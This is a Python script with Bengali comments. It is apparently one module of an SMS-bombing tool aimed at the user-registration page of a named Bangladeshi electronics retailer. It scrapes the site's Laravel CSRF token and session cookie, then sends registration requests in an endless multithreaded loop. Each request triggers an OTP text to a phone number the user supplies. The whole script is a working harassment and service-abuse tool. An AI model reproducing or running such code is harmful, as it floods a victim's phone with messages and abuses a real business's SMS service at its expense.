import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def fetch_token_and_session():
    """
    Laravel টোকেন এবং সেশন সংগ্রহ করা।
    """
    url = "https://habibelectronicsbd.com/user-register"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Laravel টোকেন বের করা
    token_input = soup.find('input', {'name': '_token'})
    token_value = token_input.get('value') if token_input else None

    # সেশন কুকি বের করা
    set_cookie_header = response.headers.get("set-cookie")
    if not token_value or not set_cookie_header:
        raise Exception("Failed to retrieve token or session cookie.")

    # Laravel session আলাদা করা
    cookies = set_cookie_header.split(";")
    laravel_session = None
    for cookie in cookies:
        if "laravel_session=" in cookie:
            laravel_session = cookie.split("laravel_session=")[1].strip()
            break

    if not laravel_session:
        raise Exception("Failed to retrieve Laravel session.")

    return token_value, laravel_session

def send_request(token_value, laravel_session, phone_number):
    """
    একটি OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    url = "https://habibelectronicsbd.com/user-register"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"laravel_session={laravel_session}",
    }
    data = {
        "_token": token_value,
        "phone": phone_number,
        "password": "123456"
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            total_requests += 1
            if "OTP sent successfully" in response.text:
                print(f"[api_6] [{total_requests}] : OTP Sent Successfully!")
            else:
                print(f"[api_6] [{total_requests}] : Failed to send OTP.")
        else:
            print(f"[api_6] Request failed with status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """
    প্রধান ফাংশন: একাধিক থ্রেডে OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    
    # মোবাইল নম্বর যাচাই করা (১১ ডিজিটের)
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    try:
        # Laravel টোকেন এবং সেশন সংগ্রহ করা
        token_value, laravel_session = fetch_token_and_session()
        print("Token and session fetched successfully!")
    except Exception as e:
        print(e)
        return

    # মাল্টিথ্রেডিং দিয়ে OTP রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, token_value, laravel_session, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)